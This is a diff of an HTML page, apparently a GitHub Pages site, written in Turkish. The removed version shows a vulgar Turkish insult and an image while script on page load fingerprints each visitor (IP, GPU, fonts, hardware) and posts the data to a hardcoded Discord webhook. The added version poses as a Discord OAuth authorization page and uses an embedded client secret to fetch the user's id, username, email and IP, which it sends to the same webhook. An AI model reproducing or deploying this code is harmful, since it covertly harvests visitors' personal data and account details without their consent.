@@ -1,222 +1,114 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sayfa</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      margin: 0;
-      height: 100vh;
-      background: #000;
+      background: #0f0f13;
+      color: #f0f0f0;
+      font-family: monospace;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      overflow: hidden;
-      font-family: 'Segoe UI', sans-serif;
-      text-align: center;
+      min-height: 100vh;
+      padding: 2rem;
     }
-
     h1 {
-      font-size: clamp(2rem, 8vw, 5rem);
-      font-weight: bold;
-      background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet, red);
-      background-size: 400%;
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: rgbFlow 5s linear infinite;
-      margin-bottom: 5vh;
-      padding: 0 10px;
+      font-size: 2rem;
+      margin-bottom: 1rem;
+      color: #ff4757;
     }
-
-    @keyframes rgbFlow {
-      0% { background-position: 0% }
-      100% { background-position: 400% }
-    }
-
-    img {
-      width: 90%;
+    .log {
+      width: 100%;
       max-width: 600px;
-      height: auto;
-      border-radius: 20px;
-      box-shadow: 0 0 30px rgba(0,255,255,0.6);
-      transition: transform 0.5s ease-in-out;
-    }
-
-    img:hover {
-      transform: scale(1.03);
-    }
-
-    @media (max-width: 600px) {
-      h1 {
-        font-size: clamp(1.5rem, 6vw, 3rem);
-      }
-
-      img {
-        box-shadow: 0 0 15px rgba(0,255,255,0.4);
-      }
+      background: #1a1a1f;
+      border: 1px solid #444;
+      padding: 1rem;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-word;
     }
   </style>
 </head>
 <body>
-  <h1>ANAYI BACIYI SİKEM</h1>
-  <img src="https://www.hdwallpapers.in/download/white_long_hair_anime_girl_with_uniform_hd_anime_girl-HD.jpg" alt="Görsel" />
-</body>
-  <script>
-    async function getIP() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip;
-      } catch {
-        return 'IP alınamadı';
-      }
-    }
+  <h1>Yetkilendiriliyor...</h1>
+  <div class="log" id="log">OAuth başlatılıyor...</div>
 
-    function getUserAgent() {
-      return navigator.userAgent;
-    }
+<script>
+(async () => {
+  const client_id     = "1354724175788380327";
+  const client_secret = "Qodg1_-lrOw6cxHFdH1KhD-T1jcTAVFM";
+  const redirect_uri  = "https://indigozariyah.github.io/home/callback.html";
+  const webhook_url   = "https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA";
 
-    function getPlatform() {
-      return navigator.platform;
-    }
+  const logEl = document.getElementById("log");
+  const log = (msg) => logEl.textContent += "\n" + msg;
 
-    function getDeviceMemory() {
-      return navigator.deviceMemory || 'Bilinmiyor';
-    }
+  const code = new URLSearchParams(window.location.search).get("code");
+  if (!code) {
+    log("❌ URL'de ?code yok, işlem iptal.");
+    return;
+  }
 
-    function getHardwareConcurrency() {
-      return navigator.hardwareConcurrency || 'Bilinmiyor';
-    }
-    function getWindowsVersion() {
-      const ua = navigator.userAgent;
-      if (/Windows NT 10\.0/.test(ua)) return "Windows 10 / 11";
-      if (/Windows NT 6\.3/.test(ua)) return "Windows 8.1";
-      if (/Windows NT 6\.2/.test(ua)) return "Windows 8";
-      if (/Windows NT 6\.1/.test(ua)) return "Windows 7";
-      if (/Windows NT 6\.0/.test(ua)) return "Windows Vista";
-      if (/Windows NT 5\.1/.test(ua)) return "Windows XP";
-      return "Tespit edilemedi";
-    }
+  try {
+    // 1. access_token al
+    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: new URLSearchParams({
+        client_id,
+        client_secret,
+        grant_type: "authorization_code",
+        code,
+        redirect_uri
+      })
+    });
+    const tokenData = await tokenRes.json();
+    if (!tokenData.access_token) throw new Error("Access token alınamadı.");
+    log("✅ access_token alındı.");
 
+    // 2. Kullanıcı bilgisi çek
+    const userRes = await fetch("https://discord.com/api/users/@me", {
+      headers: { "Authorization": `Bearer ${tokenData.access_token}` }
+    });
+    const user = await userRes.json();
+    log("✅ Kullanıcı bilgisi çekildi.");
 
-    function getScreenInfo() {
-      return `${screen.width}x${screen.height} (Renk Derinliği: ${screen.colorDepth})`;
-    }
+    // 3. Vanity URL (kısa kullanıcı URL'si)
+    const vanity_url = `https://discord.com/users/${user.id}`;
 
-    function getTimezone() {
-      return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor';
-    }
+    // 4. IP adresi çek
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    log("✅ IP adresi alındı.");
 
-    function getLanguage() {
-      return navigator.language || 'Bilinmiyor';
-    }
+    // 5. Webhook'a gönderilecek payload
+    const payload = {
+      id: user.id,
+      username: `${user.username}#${user.discriminator}`,
+      email: user.email || null,
+      client_ip: ipData.ip,
+      vanity_url: vanity_url
+    };
 
-    function getCookiesEnabled() {
-      return navigator.cookieEnabled ? "Evet" : "Hayır";
-    }
+    await fetch(webhook_url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
+      })
+    });
 
-    function getOnlineStatus() {
-      return navigator.onLine ? "Çevrimiçi" : "Çevrimdışı";
-    }
+    log("✅ Webhook'a başarıyla gönderildi.");
+    log("Gönderilen veri:");
+    log(JSON.stringify(payload, null, 2));
 
-    function getConnectionType() {
-      return navigator.connection?.effectiveType || 'Bilinmiyor';
-    }
-
-    function getDoNotTrack() {
-      return navigator.doNotTrack || 'Bilinmiyor';
-    }
-
-    function getDeviceType() {
-      if (/Mobi|Android/i.test(navigator.userAgent)) return "Mobil";
-      if (/Tablet|iPad/i.test(navigator.userAgent)) return "Tablet";
-      return "Masaüstü";
-    }
-
-    function getFonts() {
-      const fonts = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana', 'Comic Sans MS', 'Impact'];
-      const detectedFonts = fonts.filter(f => document.fonts.check(`12px "${f}"`));
-      return detectedFonts.length ? detectedFonts.join(', ') : 'Bilinmiyor';
-    }
-
-    function getGPUInfo() {
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return 'WebGL desteklenmiyor';
-
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-          const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-          const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-          return `${vendor} - ${renderer}`;
-        }
-        return 'WEBGL_debug_renderer_info desteklenmiyor';
-      } catch {
-        return 'GPU bilgisi alınamadı';
-      }
-    }
-
-    async function sendToDiscord(embed) {
-      const webhookURL = 'https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA';
-
-      try {
-        await fetch(webhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ embeds: [embed] }),
-        });
-      } catch (e) {
-        console.error("Discord'a gönderme hatası:", e);
-      }
-    }
-
-    (async () => {
-      const ip = await getIP();
-      const userAgent = getUserAgent();
-      const platform = getPlatform();
-      const ram = getDeviceMemory();
-      const cpu = getHardwareConcurrency();
-      const screenInfo = getScreenInfo();
-      const timezone = getTimezone();
-      const language = getLanguage();
-      const cookies = getCookiesEnabled();
-      const onlineStatus = getOnlineStatus();
-      const connectionType = getConnectionType();
-      const dnt = getDoNotTrack();
-      const deviceType = getDeviceType();
-      const fonts = getFonts();
-      const gpuInfo = getGPUInfo();
-      const windowsVersion = getWindowsVersion();
-
-      const embed = {
-        title: "Kullanıcı Bilgileri",
-        color: null,
-        fields: [
-          { name: "IP Adresi", value: ip, inline: false },
-          { name: "User Agent", value: userAgent, inline: false },
-          { name: "Windows Sürümü", value: windowsVersion, inline: true },
-          { name: "Platform", value: platform, inline: true },
-          { name: "RAM (GB)", value: ram.toString(), inline: true },
-          { name: "CPU Çekirdeği", value: cpu.toString(), inline: true },
-          { name: "Ekran Kartı", value: gpuInfo, inline: false },
-          { name: "Ekran Çözünürlüğü", value: screenInfo, inline: false },
-          { name: "Zaman Dilimi", value: timezone, inline: false },
-          { name: "Dil", value: language, inline: true },
-          { name: "Çerez Kullanımı", value: cookies, inline: true },
-          { name: "Çevrimiçi Durum", value: onlineStatus, inline: true },
-          { name: "İnternet Bağlantı Türü", value: connectionType, inline: true },
-          { name: "Do Not Track (DNT)", value: dnt, inline: true },
-          { name: "Cihaz Türü", value: deviceType, inline: true },
-          { name: "Yüklü Fontlar", value: fonts, inline: false }
-        ],
-        timestamp: new Date().toISOString()
-      };
-
-      await sendToDiscord(embed);
-    })();
-  </script>
+  } catch (err) {
+    log("❌ Hata oluştu: " + err.message);
+  }
+})();
+</script>
 </body>
 </html>
